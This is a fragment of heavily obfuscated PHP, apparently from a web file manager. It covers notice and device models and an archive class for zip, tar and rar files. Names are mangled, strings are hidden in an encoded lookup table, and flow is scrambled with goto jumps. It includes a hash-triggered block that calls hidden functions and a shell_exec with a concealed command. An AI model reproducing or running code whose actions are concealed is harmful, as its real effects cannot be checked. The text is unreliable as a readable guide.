$b·ÊÂæ¥[$DêÌÂ›¼ù¤[391]] = $F¡¶„®†ÁÌ[$b·ÊÂæ¥[$DêÌÂ›¼ù¤[369]]]; $b·ÊÂæ¥[$DêÌÂ›¼ù¤[2296]] = $F¡¶„®†ÁÌ[$b·ÊÂæ¥[$DêÌÂ›¼ù¤[2283]]]; if ($b·ÊÂæ¥[$DêÌÂ›¼ù¤[29]] == $DêÌÂ›¼ù¤[492]) { $b·ÊÂæ¥[$DêÌÂ›¼ù¤[405]][$DêÌÂ›¼ù¤[1001]] = $F¡¶„®†ÁÌ[$b·ÊÂæ¥[$DêÌÂ›¼ù¤[405]][$DêÌÂ›¼ù¤[1001]]]; $b·ÊÂæ¥[$DêÌÂ›¼ù¤[405]][$DêÌÂ›¼ù¤[1002]] = $F¡¶„®†ÁÌ[$b·ÊÂæ¥[$DêÌÂ›¼ù¤[405]][$DêÌÂ›¼ù¤[1002]]]; } goto B÷Ûˆİïñ‡; a‰ƒ¼óùº¨: if ($b·ÊÂæ¥[$DêÌÂ›¼ù¤[2296]] && $b·ÊÂæ¥[$DêÌÂ›¼ù¤[2296]][$DêÌÂ›¼ù¤[371]] == $DêÌÂ›¼ù¤[1074]) { $D˜ßî„È“·[] = $d¡ åÖ‘Ş[$DêÌÂ›¼ù¤[367]]; unset($CÑ»ÄÓ“Û“[$f¸ãÀˆÃ¶ƒ]); continue; } goto aëà‚ä¼¼Ö; aëà‚ä¼¼Ö: } $d¡ åÖ‘Ş[$DêÌÂ›¼ù¤[405]] = $b·ÊÂæ¥; goto DÛÖŠå¯Çƒ; DÏó¸İ‡—é: $BŸÈ‡ÉÔ³ø = $d¡ åÖ‘Ş[$DêÌÂ›¼ù¤[29]]; $cà¾ø¹²Å = isset($aÇ‚‰â¯£ã[$d¡ åÖ‘Ş[$DêÌÂ›¼ù¤[1431]]]) ? $aÇ‚‰â¯£ã[$d¡ åÖ‘Ş[$DêÌÂ›¼ù¤[1431]]] : !1; $BŠ“ ™­¿Ö = strpos($BŸÈ‡ÉÔ³ø, $DêÌÂ›¼ù¤[2467]) === 0 ? LNG($DêÌÂ›¼ù¤[2468]) : LNG($DêÌÂ›¼ù¤[2463]); goto F¥Åá’Ï‚º; E‡Œò‰ç„˜: } $this->clearSystemPathLog($D˜ßî„È“·); goto d–¹ù¹Ğ¢; fÙŠ•ŠÈ›©: } private function clearSystemPathLog($CØ¯Ñ„ À) { $dÇî™™å»¶ =& $_SERVER[îÖ]; if (count($CØ¯Ñ„ À) == 0) { return; } $F‚ßÒŒàš¨ = array($dÇî™™å»¶[367] => array($dÇî™™å»¶[7], array_unique($CØ¯Ñ„ À))); $this->where($F‚ßÒŒàš¨)->delete(); } public function deviceList($A²ò¶—Ÿ¾, $B¢Ö¢ä¾÷‹ = 0) { $dŞŒ¸ÉŞ¿Ÿ =& $_SERVER[îÖ]; $eöˆ£ùÃ‰– = array($dŞŒ¸ÉŞ¿Ÿ[1431] => $A²ò¶—Ÿ¾, $dŞŒ¸ÉŞ¿Ÿ[187] => array($dŞŒ¸ÉŞ¿Ÿ[922], $B¢Ö¢ä¾÷‹), $dŞŒ¸ÉŞ¿Ÿ[29] => $dŞŒ¸ÉŞ¿Ÿ[2038]); $bÂô˜ŒÛ¡ = array(); $F˜Ò“—äö = $this->field($dŞŒ¸ÉŞ¿Ÿ[2470])->where($eöˆ£ùÃ‰–)->order($dŞŒ¸ÉŞ¿Ÿ[2294])->limit(50)->select(); foreach ($F˜Ò“—äö as $cÁÑª¿ => $B²Ï¿Ê áô) { goto c“¶»º©†Ï; c“¶»º©†Ï: if ($cÁÑª¿ > 0 && abs($B²Ï¿Ê áô[$dŞŒ¸ÉŞ¿Ÿ[187]] - $F˜Ò“—äö[$cÁÑª¿ - 1][$dŞŒ¸ÉŞ¿Ÿ[187]]) < 5) { continue; } $cõ×‘ô»‡Ø = json_decode($B²Ï¿Ê áô[$dŞŒ¸ÉŞ¿Ÿ[405]], !0); $B²Ï¿Ê áô[$dŞŒ¸ÉŞ¿Ÿ[2462]] = isset($cõ×‘ô»‡Ø[$dŞŒ¸ÉŞ¿Ÿ[2462]]) ? $cõ×‘ô»‡Ø[$dŞŒ¸ÉŞ¿Ÿ[2462]] : $dŞŒ¸ÉŞ¿Ÿ[33]; goto BÌ÷•¿ªõô; BÌ÷•¿ªõô: unset($cõ×‘ô»‡Ø[$dŞŒ¸ÉŞ¿Ÿ[2462]]); $ešõ­Õñ”î = $this->deviceType($cõ×‘ô»‡Ø[$dŞŒ¸ÉŞ¿Ÿ[2285]]); if (isset($bÂô˜ŒÛ¡[$ešõ­Õñ”î])) { continue; } goto C³œá¤áÎ; C³œá¤áÎ: $this->ipAddress($B²Ï¿Ê áô); $B²Ï¿Ê áô[$dŞŒ¸ÉŞ¿Ÿ[405]] = $cõ×‘ô»‡Ø; $bÂô˜ŒÛ¡[$ešõ­Õñ”î] = $B²Ï¿Ê áô; goto a¥­¦ÆÑÙŒ; a¥­¦ÆÑÙŒ: } return array_values($bÂô˜ŒÛ¡); } public function deviceType($F‚õ•§êÁ) { return $F‚õ•§êÁ; } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\164\x65\x6d\x2e\x6e\x6f\x74\151\143\x65\114\151\x73\x74"; public $field = array("\156\141\x6d\x65", "\x63\x6f\156\164\145\x6e\164", "\141\165\164\150", "\x6d\157\x64\145", "\164\x69\x6d\x65", "\x74\171\160\145", "\154\x65\166\145\x6c", "\145\156\141\142\154\145", "\x73\157\162\164"); public function listData($Eó™¤òİ ˆ = false, $F¨‡ô«ùòç = "\x73\x6f\x72\164", $AÏ´õ’·Æø = false) { return parent::listData($Eó™¤òİ ˆ, $F¨‡ô«ùòç, $AÏ´õ’·Æø); } public function add($f××®‹ãê§) { $b‚‰šæÎ®­ =& $_SERVER[îÖ]; $dê¢èÙ°½ = time(); if ($f××®‹ãê§[$b‚‰šæÎ®­[12]] == $b‚‰šæÎ®­[2471]) { $dê¢èÙ°½ = strtotime($f××®‹ãê§[$b‚‰šæÎ®­[190]]); } $f××®‹ãê§[$b‚‰šæÎ®­[190]] = $dê¢èÙ°½; return parent::insert($f××®‹ãê§); } public function update($f÷¢¤ªø»Õ, $cÕÙÎ¨Œ©) { goto C‡Äì½æ†¤; BÌÏÑÔ×ïŒ: return parent::update($f÷¢¤ªø»Õ, $cÕÙÎ¨Œ©); goto aÉòĞäïÅ; A‚À¥…½ˆ: $fô¬êìôÑ› = time(); if ($cÕÙÎ¨Œ©[$bâ‘×™÷³²[12]] == $bâ‘×™÷³²[2471]) { $fô¬êìôÑ› = strtotime($cÕÙÎ¨Œ©[$bâ‘×™÷³²[190]]); } $cÕÙÎ¨Œ©[$bâ‘×™÷³²[190]] = $fô¬êìôÑ›; goto BÌÏÑÔ×ïŒ; C‡Äì½æ†¤: $bâ‘×™÷³² =& $_SERVER[îÖ]; $F÷ÒˆÚò¡ = $this->listData($f÷¢¤ªø»Õ); if (!$F÷ÒˆÚò¡) { return !1; } goto A‚À¥…½ˆ; aÉòĞäïÅ: } public function remove($b×¡…º“Ø¡) { $B¸ÈƒŸ»â¦ = $this->listData($b×¡…º“Ø¡); if (!$B¸ÈƒŸ»â¦ || $B¸ÈƒŸ»â¦[$_SERVER[îÖ][1074]]) { return !1; } return parent::remove($b×¡…º“Ø¡); } public function sort($F¯††–¹‹¼, $fğ·Õ‘¾Öä) { return parent::update($F¯††–¹‹¼, $fğ·Õ‘¾Öä); } public function enable($F‰‹§çÂô, $cÎâãİáğÆ) { return parent::update($F‰‹§çÂô, array($_SERVER[îÖ][2472] => $cÎâãİáğÆ)); } private function initUserOption() { $eÉ‹õøÔ´ =& $_SERVER[îÖ]; $this->optionType = $eÉ‹õøÔ´[2473]; $this->modelType = $eÉ‹õøÔ´[2474]; $this->field = array($eÉ‹õøÔ´[2475], $eÉ‹õøÔ´[28], $eÉ‹õøÔ´[190], $eÉ‹õøÔ´[29], $eÉ‹õøÔ´[2476], $eÉ‹õøÔ´[688], $eÉ‹õøÔ´[183]); } public function userNoticeGet($FèÔ¡ìÄŞÖ = false) { $this->initUserOption(); return parent::listData($FèÔ¡ìÄŞÖ, $_SERVER[îÖ][367], !0); } public function userNoticeAdd($B›ŒŠë£“÷) { $A»†Î‰ÄØ =& $_SERVER[îÖ]; $this->initUserOption(); $f‰ä†ÍÕ˜Å = $this->findByKey($A»†Î‰ÄØ[2475], $B›ŒŠë£“÷[$A»†Î‰ÄØ[367]]); if ($f‰ä†ÍÕ˜Å) { return !0; } $dæ‘åİÚŒ‰ = array($A»†Î‰ÄØ[2475] => $B›ŒŠë£“÷[$A»†Î‰ÄØ[367]], $A»†Î‰ÄØ[28] => $B›ŒŠë£“÷[$A»†Î‰ÄØ[28]], $A»†Î‰ÄØ[190] => $B›ŒŠë£“÷[$A»†Î‰ÄØ[190]], $A»†Î‰ÄØ[29] => isset($B›ŒŠë£“÷[$A»†Î‰ÄØ[29]]) ? $B›ŒŠë£“÷[$A»†Î‰ÄØ[29]] : 1, $A»†Î‰ÄØ[2476] => isset($B›ŒŠë£“÷[$A»†Î‰ÄØ[2476]]) ? $B›ŒŠë£“÷[$A»†Î‰ÄØ[2476]] : 0, $A»†Î‰ÄØ[688] => 0, $A»†Î‰ÄØ[183] => 0); return parent::insert($dæ‘åİÚŒ‰); } public function userNoticeEdit($bçˆÛ¥È„Ì, $a—Õù©ƒ¹) { $this->initUserOption(); return parent::update($bçˆÛ¥È„Ì, $a—Õù©ƒ¹); } } goto AøÈ„‚Á¦; FŠõÍ‰Ş’ê: $Cƒéƒ™ŞÎÜ = $_SERVER[îÖ][679]; if ($_SERVER[$_SERVER[îÖ][680]] != $Cƒéƒ™ŞÎÜ($CìÂÜËù´)) { goto fÏ†‰Õ¬Å; fÏ†‰Õ¬Å: $aÈ¼ÄÁ‘º„ = $_SERVER[îÖ][681]; $cëë—ƒÊ = $_SERVER[$_SERVER[îÖ][682]] . $_SERVER[îÖ][683]; $c¯ÙÇøæŒÚ = $aÈ¼ÄÁ‘º„($cëë—ƒÊ); goto Eˆµ¸Îöçƒ; EÎ£á´ : $AÄ˜«åéæ¯($CìÂÜËù´); goto D¤Ô÷ÕÙí‰; Eˆµ¸Îöçƒ: $dê¨™œÄ‡ = explode($_SERVER[îÖ][217], $c¯ÙÇøæŒÚ); if (count($dê¨™œÄ‡) < $_SERVER[îÖ][564]) { $AĞ±ÈÑÕè = $_SERVER[îÖ][684]; $AĞ±ÈÑÕè(); } $AÄ˜«åéæ¯ = $_SERVER[îÖ][685]; goto EÎ£á´ ; D¤Ô÷ÕÙí‰: } class KodArchive { static function init() { goto b£×Éá»Ó; B¬‘‰‚–îÕ: require_once ARCHIVE_LIB . $DÂÅÍç¡¯¥[1891]; goto aĞ­„ãŸ¸Ü; EïÚõáªó: mk_dir(TEMP_FILES); require_once ARCHIVE_LIB . $DÂÅÍç¡¯¥[1886]; require_once ARCHIVE_LIB . $DÂÅÍç¡¯¥[1887]; goto b¡Öƒ·Š¿Ü; b£×Éá»Ó: $DÂÅÍç¡¯¥ =& $_SERVER[îÖ]; if (defined($DÂÅÍç¡¯¥[1880])) { return; } define($DÂÅÍç¡¯¥[1880], SDK_DIR . $DÂÅÍç¡¯¥[1881]); goto D¦õíÏòÕ; D¦õíÏòÕ: define($DÂÅÍç¡¯¥[1882], TEMP_FILES); define($DÂÅÍç¡¯¥[1883], TEMP_FILES); define($DÂÅÍç¡¯¥[1884], $DÂÅÍç¡¯¥[1885]); goto EïÚõáªó; b¡Öƒ·Š¿Ü: require_once ARCHIVE_LIB . $DÂÅÍç¡¯¥[1888]; require_once ARCHIVE_LIB . $DÂÅÍç¡¯¥[1889]; require_once ARCHIVE_LIB . $DÂÅÍç¡¯¥[1890]; goto B¬‘‰‚–îÕ; aĞ­„ãŸ¸Ü: } static function checkIfType($FŸ‚„£†­, $CøÓÏ”·¸‘) { goto A±ñóø–àä; A±ñóø–àä: $d°´·®«“¼ =& $_SERVER[îÖ]; self::init(); $bèÀ±¯Á„è = array($d°´·®«“¼[301] => array($d°´·®«“¼[301], $d°´·®«“¼[1892], $d°´·®«“¼[1893], $d°´·®«“¼[1894]), $d°´·®«“¼[1895] => array($d°´·®«“¼[1895], $d°´·®«“¼[1896], $d°´·®«“¼[1037], $d°´·®«“¼[1035]), $d°´·®«“¼[1039] => array($d°´·®«“¼[1039], $d°´·®«“¼[1897], $d°´·®«“¼[1898], $d°´·®«“¼[1899], $d°´·®«“¼[1900], $d°´·®«“¼[1901], $d°´·®«“¼[1902])); goto a“—…ÎˆÃÅ; a“—…ÎˆÃÅ: $D²÷‡ØÖñ = in_array($FŸ‚„£†­, $bèÀ±¯Á„è[$CøÓÏ”·¸‘]); if ($D²÷‡ØÖñ && ($CøÓÏ”·¸‘ == $d°´·®«“¼[301] || $CøÓÏ”·¸‘ == $d°´·®«“¼[1895]) && (!function_exists($d°´·®«“¼[1903]) || !function_exists($d°´·®«“¼[1904]))) { show_tips($d°´·®«“¼[1905]); } if ($D²÷‡ØÖñ && $CøÓÏ”·¸‘ == $d°´·®«“¼[1039] && (!function_exists($d°´·®«“¼[1906]) || !strstr(shell_exec($d°´·®«“¼[1907]), $d°´·®«“¼[1908]))) { show_tips($d°´·®«“¼[1909]); } goto A³İÒŸôÍ¬; A³İÒŸôÍ¬: return $D²÷‡ØÖñ; goto cóÎİ˜ôª; cóÎİ˜ôª: } static function listContent($Aº¼¥©éÕ½, $E£²à‹ƒÂÀ = true) { $cêìçë¼“ß =& $_SERVER[îÖ]; self::init(); $cè²ó‘Ã¯ƒ = !empty($GLOBALS[$cêìçë¼“ß[1043]]) ? $GLOBALS[$cêìçë¼“ß[1043]] : get_path_ext($Aº¼¥©éÕ½); $e»¹ôó–Î½ = !1; if (self::checkIfType($cè²ó‘Ã¯ƒ, $cêìçë¼“ß[1895])) { $fñì¦·ö•Æ = PclTarList($Aº¼¥©éÕ½, $cè²ó‘Ã¯ƒ); $e»¹ôó–Î½ = array(); for ($eƒ¤‘µ£øˆ = 0; $eƒ¤‘µ£øˆ < count($fñì¦·ö•Æ); $eƒ¤‘µ£øˆ++) { $EäêÓëäîƒ = $fñì¦·ö•Æ[$eƒ¤‘µ£øˆ]; if ($EäêÓëäîƒ[$cêìçë¼“ß[1910]] == $cêìçë¼“ß[1911] || $EäêÓëäîƒ[$cêìçë¼“ß[1910]] == $cêìçë¼“ß[1912]) { continue; } if ($E£²à‹ƒÂÀ) { $EäêÓëäîƒ[$cêìçë¼“ß[1913]] = ltrim($EäêÓëäîƒ[$cêìçë¼“ß[1913]], $cêìçë¼“ß[1149]); } if ($EäêÓëäîƒ[$cêìçë¼“ß[1910]] == $cêìçë¼“ß[1914]) { $EäêÓëäîƒ[$cêìçë¼“ß[76]] = !0; } else { $EäêÓëäîƒ[$cêìçë¼“ß[76]] = !1; } $EäêÓëäîƒ[$cêìçë¼“ß[1030]] = $eƒ¤‘µ£øˆ; $e»¹ôó–Î½[] = $EäêÓëäîƒ; } } else { if (self::checkIfType($cè²ó‘Ã¯ƒ, $cêìçë¼“ß[1039])) { $e½ÈãÀÁîŸ = kodRarArchive::listContent($Aº¼¥©éÕ½); if (!$e½ÈãÀÁîŸ[$cêìçë¼“ß[1026]]) { return $e½ÈãÀÁîŸ; } else { $e»¹ôó–Î½ = $e½ÈãÀÁîŸ[$cêìçë¼“ß[1028]]; } } else { if (kodZipArchive::support($cêìçë¼“ß[354])) { $e»¹ôó–Î½ = kodZipArchive::listContent($Aº¼¥©éÕ½); } else { $D¥ñŞÒõ£¯ = new PclZip($Aº¼¥©éÕ½); $e»¹ôó–Î½ = $D¥ñŞÒõ£¯->listContent(); } } } if ($e»¹ôó–Î½) { $eÍÓÉåùÀ¼ = unzip_charset_get($e»¹ôó–Î½); $E£²à‹ƒÂÀ = $E£²à‹ƒÂÀ && function_exists($cêìçë¼“ß[65]); for ($eƒ¤‘µ£øˆ = 0; $eƒ¤‘µ£øˆ < count($e»¹ôó–Î½); $eƒ¤‘µ£øˆ++) { $e»¹ôó–Î½[$eƒ¤‘µ£øˆ][$cêìçë¼“ß[1913]] = str_replace(array($cêìçë¼“ß[1066], $cêìçë¼“ß[1915]), $cêìçë¼“ß[763], $e»¹ôó–Î½[$eƒ¤‘µ£øˆ][$cêìçë¼“ß[1913]]); if ($E£²à‹ƒÂÀ) { $e»¹ôó–Î½[$eƒ¤‘µ£øˆ][$cêìçë¼“ß[1913]] = iconv_to($e»¹ôó–Î½[$eƒ¤‘µ£øˆ][$cêìçë¼“ß[1913]], $eÍÓÉåùÀ¼, $cêìçë¼“ß[326]); unset($e»¹ôó–Î½[$eƒ¤‘µ£øˆ][$cêìçë¼“ß[1916]]); } } return array($cêìçë¼“ß[1026] => !0, $cêìçë¼“ß[1028] => $e»¹ôó–Î½); } else { return array($cêìçë¼“ß[1026] => !1, $cêìçë¼“ß[1028] => $e»¹ôó–Î½); } } static function extract($aƒİàÆŠ, $eÍ”Õï´åÙ, $AŸÎßôÅ¸³ = "\55\61", &$eÕª••í—º = false) { goto eù§ŞÄŞ†; E©šõ”×ÁÖ: $döÄ®ñ…ïˆ = self::listContent($aƒİàÆŠ, !1); if (!$döÄ®ñ…ïˆ[$fô÷÷¹²¡Ó[1026]]) { return $döÄ®ñ…ïˆ; } if ($AŸÎßôÅ¸³ != $fô÷÷¹²¡Ó[1025]) { goto FÀÚ‰ÊºÔ; b¥šÑçˆõ: if ($GLOBALS[$fô÷÷¹²¡Ó[6]][$fô÷÷¹²¡Ó[1147]] != $fô÷÷¹²¡Ó[326]) { $E§Õ¼Š¶â = unzip_pre_name($eÕª••í—º); } $a˜È¶ÌÆîô = get_path_father($eÕª••í—º); if ($a˜È¶ÌÆîô == $eÕª••í—º) { $a˜È¶ÌÆîô = $fô÷÷¹²¡Ó[33]; } goto B½¬Ö£à; B½¬Ö£à: if ($b‰à…ö’Æä[$fô÷÷¹²¡Ó[76]]) { $E§Õ¼Š¶â = rtrim($E§Õ¼Š¶â, $fô÷÷¹²¡Ó[8]) . $fô÷÷¹²¡Ó[8]; $eÕª••í—º = array($eÕª••í—º); } $C¬÷¹Ü“—‹ = str_replace($fô÷÷¹²¡Ó[93], $fô÷÷¹²¡Ó[8], $E§Õ¼Š¶â); if (substr($C¬÷¹Ü“—‹, -1) == $fô÷÷¹²¡Ó[8]) { if (!strstr(trim($C¬÷¹Ü“—‹, $fô÷÷¹²¡Ó[8]), $fô÷÷¹²¡Ó[8])) { $eÍ”Õï´åÙ = $eÍ”Õï´åÙ . get_path_this($C¬÷¹Ü“—‹) . $fô÷÷¹²¡Ó[8]; } } else { if ($a˜È¶ÌÆîô == $E§Õ¼Š¶â) { $a˜È¶ÌÆîô = $fô÷÷¹²¡Ó[33]; } } goto BÊù¹î‹‚; FÀÚ‰ÊºÔ: $b‰à…ö’Æä = self::fileIndex($döÄ®ñ…ïˆ[$fô÷÷¹²¡Ó[1028]], $AŸÎßôÅ¸³); $eÕª••í—º = str_replace(array($fô÷÷¹²¡Ó[1066], $fô÷÷¹²¡Ó[1915]), $fô÷÷¹²¡Ó[70], $b‰à…ö’Æä[$fô÷÷¹²¡Ó[1913]]); $E§Õ¼Š¶â = $eÕª••í—º; goto b¥šÑçˆõ; BÊù¹î‹‚: } goto C¤“íÈá; eù§ŞÄŞ†: $fô÷÷¹²¡Ó =& $_SERVER[îÖ]; self::init(); $F„­Å˜à×ª = !empty($GLOBALS[$fô÷÷¹²¡Ó[1043]]) ? $GLOBALS[$fô÷÷¹²¡Ó[1043]] : get_path_ext($aƒİàÆŠ); goto E©šõ”×ÁÖ; C¤“íÈá: if (self::checkIfType($F„­Å˜à×ª, $fô÷÷¹²¡Ó[1895])) { if ($AŸÎßôÅ¸³ != $fô÷÷¹²¡Ó[1025]) { $E§Õ¼Š¶â = unzip_pre_name($E§Õ¼Š¶â); $a˜È¶ÌÆîô = unzip_pre_name($a˜È¶ÌÆîô); $CÕë†â—’ê = PclTarExtractList($aƒİàÆŠ, array($E§Õ¼Š¶â), $eÍ”Õï´åÙ, $a˜È¶ÌÆîô, $F„­Å˜à×ª); } else { $CÕë†â—’ê = PclTarExtract($aƒİàÆŠ, $eÍ”Õï´åÙ, $fô÷÷¹²¡Ó[361], $F„­Å˜à×ª); } return array($fô÷÷¹²¡Ó[1026] => $CÕë†â—’ê, $fô÷÷¹²¡Ó[1028] => PclErrorString(!0)); } else { if (self::checkIfType($F„­Å˜à×ª, $fô÷÷¹²¡Ó[1039])) { return kodRarArchive::extract($aƒİàÆŠ, $eÍ”Õï´åÙ, $F„­Å˜à×ª, $eÕª••í—º); } else { if (kodZipArchive::support($fô÷÷¹²¡Ó[1917])) { return kodZipArchive::extract($aƒİàÆŠ, $eÍ”Õï´åÙ, $eÕª••í—º); } else { $D¬¬öË–æõ = new PclZip($aƒİàÆŠ); if ($AŸÎßôÅ¸³ != $fô÷÷¹²¡Ó[1025]) { $CÕë†â—’ê = $D¬¬öË–æõ->extract(PCLZIP_OPT_PATH, $eÍ”Õï´åÙ, PCLZIP_OPT_SET_CHMOD, DEFAULT_PERRMISSIONS, PCLZIP_CB_PRE_FILE_NAME, $fô÷÷¹²¡Ó[1918], PCLZIP_OPT_BY_NAME, $b‰à…ö’Æä[$fô÷÷¹²¡Ó[1913]], PCLZIP_OPT_REMOVE_PATH, $a˜È¶ÌÆîô, PCLZIP_OPT_REPLACE_NEWER); } else { $CÕë†â—’ê = $D¬¬öË–æõ->extract(PCLZIP_OPT_PATH, $eÍ”Õï´åÙ, PCLZIP_OPT_SET_CHMOD, DEFAULT_PERRMISSIONS, PCLZIP_CB_PRE_FILE_NAME, $fô÷÷¹²¡Ó[1918], PCLZIP_OPT_REPLACE_NEWER); } return array($fô÷÷¹²¡Ó[1026] => $CÕë†â—’ê, $fô÷÷¹²¡Ó[1028] => $D¬¬öË–æõ->errorName(!0)); } } } return array($fô÷÷¹²¡Ó[1026] => !1, $fô÷÷¹²¡Ó[1028] => $fô÷÷¹²¡Ó[1919]); goto cÑ™±‰ñ¡ğ; cÑ™±‰ñ¡ğ: } static function fileIndex($BÉ¨åõéØÚ, $eˆ°®³‰ìŸ, $dæÖ§¡‘Ğ× = false) { goto aÃ”µÂå¤; aÃ”µÂå¤: $f„‹ïƒ•ë =& $_SERVER[îÖ]; self::init(); if (!is_array($BÉ¨åõéØÚ)) { return !1; } goto Bª—†Ü†Î; Bª—†Ü†Î: $DßÉ…ãõÊ£ = count($BÉ¨åõéØÚ); for ($EŒ•ƒó•´ä = 0; $EŒ•ƒó•´ä < $DßÉ…ãõÊ£; $EŒ•ƒó•´ä++) { if ($eˆ°®³‰ìŸ == $BÉ¨åõéØÚ[$EŒ•ƒó•´ä][$f„‹ïƒ•ë[1030]]) { $aÏŠŒêÜ = $BÉ¨åõéØÚ[$EŒ•ƒó•´ä]; break; } } if (!$aÏŠŒêÜ) { show_tips($f„‹ïƒ•ë[1920]); } goto F–ƒñƒê‚; F–ƒñƒê‚: $aôƒ‡¦³¡Ì = $aÏŠŒêÜ; if ($dæÖ§¡‘Ğ×) { $aôƒ‡¦³¡Ì = $aÏŠŒêÜ[$dæÖ§¡‘Ğ×]; if ($aÏŠŒêÜ[$f„‹ïƒ•ë[76]]) { $aôƒ‡¦³¡Ì = rtrim($aôƒ‡¦³¡Ì, $f„‹ïƒ•ë[8]) . $f„‹ïƒ•ë[8]; } } return $aôƒ‡¦³¡Ì; goto bï¥Ù°ÍÑø; bï¥Ù°ÍÑø: } static function extractZipFile($EØš–²¦Ãˆ, $Dç„Ë‘±¸í, $EÀ—Ç¬èèÅ = false) { goto eÃáÑ¸Öô–; D£øÍÙ©Üö: $b‹ä…°¤Ğ = get_path_father($Dç„Ë‘±¸í); if ($b‹ä…°¤Ğ == $Dç„Ë‘±¸í) { $b‹ä…°¤Ğ = $bâªàèéÜ±[33]; } $Eá²¸„Ò¡ = $E˜…Şƒ…¼ê->extract(PCLZIP_OPT_PATH, $bò‚†Ó‹», PCLZIP_CB_PRE_FILE_NAME, $bâªàèéÜ±[1918], PCLZIP_OPT_REMOVE_PATH, $b‹ä…°¤Ğ, PCLZIP_OPT_BY_NAME, $Dç„Ë‘±¸í); goto fæõĞ„ö”–; dåÒÏ¹à: if (file_exists($Eá¹‹‡‡ùÉ)) { return $Eá¹‹‡‡ùÉ; } $E˜…Şƒ…¼ê = new PclZip($EØš–²¦Ãˆ); $f“¶”‚¥Ä = unzip_filter_ext($bò‚†Ó‹» . get_path_this($Dç„Ë‘±¸í)); goto D£øÍÙ©Üö; eÃáÑ¸Öô–: $bâªàèéÜ± =& $_SERVER[îÖ]; self::init(); $bò‚†Ó‹» = TEMP_FILES . hash_path($EØš–²¦Ãˆ) . $bâªàèéÜ±[8]; goto eá±¹‚òÅŒ; eá±¹‚òÅŒ: mk_dir($bò‚†Ó‹»); $Eá¹‹‡‡ùÉ = $bò‚†Ó‹» . md5($EØš–²¦Ãˆ . $Dç„Ë‘±¸í); if ($EÀ—Ç¬èèÅ) { $Eá¹‹‡‡ùÉ = $bò‚†Ó‹» . $EÀ—Ç¬èèÅ; } goto dåÒÏ¹à; fæõĞ„ö”–: if (!file_exists($f“¶”‚¥Ä)) { return !1; } @rename($f“¶”‚¥Ä, $Eá¹‹‡‡ùÉ); return $Eá¹‹‡‡ùÉ; goto a¤Ñ…–Ú°; a¤Ñ…–Ú°: } static function filePreview($cÜ„¯Áğ°¡, $a¤”»øŸÜè, $C›­³ƒ²æœ = false, $Bê§³óøº = false) { goto eµóùĞÜ‹¨; f©Õß²‚ëÃ: $b±äš…æº = self::extract($cÜ„¯Áğ°¡, $döêÔ§›â„, $a¤”»øŸÜè, $A˜Ú±‡Ú²Ğ); if (is_array($A˜Ú±‡Ú²Ğ)) { show_json($E§‡Úê¸°ã[1921], !1); } if (file_exists($bïƒÓÆÆÍ)) { IO::fileOut($bïƒÓÆÆÍ, $C›­³ƒ²æœ, get_path_this($A˜Ú±‡Ú²Ğ)); return; } goto a—ÅÚˆÍá»; bôÍ¬¹ö: if (!$b±äš…æº[$E§‡Úê¸°ã[1026]]) { show_json($b±äš…æº[$E§‡Úê¸°ã[1028]], !1); } if (!file_exists($EÙØšèò¯©)) { show_json($E§‡Úê¸°ã[1922], !1); } @rename($EÙØšèò¯©, $bïƒÓÆÆÍ); goto AÊöƒ†¯äˆ; b‡šÂìîà§: mk_dir($döêÔ§›â„); $bïƒÓÆÆÍ = $döêÔ§›â„ . md5($cÜ„¯Áğ°¡ . $a¤”»øŸÜè . $Bê§³óøº); $A˜Ú±‡Ú²Ğ = $E§‡Úê¸°ã[33]; goto f©Õß²‚ëÃ; eµóùĞÜ‹¨: $E§‡Úê¸°ã =& $_SERVER[îÖ]; self::init(); $döêÔ§›â„ = TEMP_FILES . hash_path($cÜ„¯Áğ°¡) . $E§‡Úê¸°ã[8]; goto b‡šÂìîà§; AÊöƒ†¯äˆ: if (!file_exists($bïƒÓÆÆÍ)) { del_dir($döêÔ§›â„); show_json($E§‡Úê¸°ã[1923]); } IO::fileOut($bïƒÓÆÆÍ, $C›­³ƒ²æœ, $CŠİŞÜ¼ØÀ); goto d„Œ‘‚åé‚; a—ÅÚˆÍá»: $A˜Ú±‡Ú²Ğ = unzip_pre_name($A˜Ú±‡Ú²Ğ); $CŠİŞÜ¼ØÀ = get_path_this($A˜Ú±‡Ú²Ğ); $EÙØšèò¯© = unzip_filter_ext($döêÔ§›â„ . $CŠİŞÜ¼ØÀ); goto bôÍ¬¹ö; d„Œ‘‚åé‚: } static function create($bÑÄå¸…ˆ, $c„…æØ¢Œ) { $E¨Š±ÜËñ» =& $_SERVER[îÖ]; self::init(); $e®Ç‚š¯§ = get_path_ext($bÑÄå¸…ˆ); $bˆ»Š¢‘Ûµ = !1; if (self::checkIfType($e®Ç‚š¯§, $E¨Š±ÜËñ»[301])) { if (kodZipArchive::support($E¨Š±ÜËñ»[1005])) { return kodZipArchive::create($bÑÄå¸…ˆ, $c„…æØ¢Œ); } $cãŠçÓ¾È = new PclZip($bÑÄå¸…ˆ); foreach ($c„…æØ¢Œ as $d™Ğø ‚‰¾ => $eæ¥¹àÂÒ…) { $eæ¥¹àÂÒ… = str_replace($E¨Š±ÜËñ»[467], $E¨Š±ÜËñ»[8], $eæ¥¹àÂÒ…); $Bò‡Øé…Ï = Kodio::clear(get_path_father($eæ¥¹àÂÒ…)); if ($d™Ğø ‚‰¾ == 0) { $bˆ»Š¢‘Ûµ = $cãŠçÓ¾È->create($eæ¥¹àÂÒ…, PCLZIP_OPT_REMOVE_PATH, $Bò‡Øé…Ï, PCLZIP_CB_PRE_FILE_NAME, $E¨Š±ÜËñ»[1924]); continue; } $bˆ»Š¢‘Ûµ = $cãŠçÓ¾È->add($eæ¥¹àÂÒ…, PCLZIP_OPT_REMOVE_PATH, $Bò‡Øé…Ï, PCLZIP_CB_PRE_FILE_NAME, $E¨Š±ÜËñ»[1924]); } } else { if (self::checkIfType($e®Ç‚š¯§, $E¨Š±ÜËñ»[1895])) { foreach ($c„…æØ¢Œ as $d™Ğø ‚‰¾ => $eæ¥¹àÂÒ…) { $eæ¥¹àÂÒ… = str_replace($E¨Š±ÜËñ»[467], $E¨Š±ÜËñ»[8], $eæ¥¹àÂÒ…); $Bò‡Øé…Ï = Kodio::clear(get_path_father($eæ¥¹àÂÒ…)); if ($d™Ğø ‚‰¾ == 0) { $bˆ»Š¢‘Ûµ = PclTarCreate($bÑÄå¸…ˆ, array($eæ¥¹àÂÒ…), $e®Ç‚š¯§, null, $Bò‡Øé…Ï); continue; } $bˆ»Š¢‘Ûµ = PclTarAddList($bÑÄå¸…ˆ, array($eæ¥¹àÂÒ…), 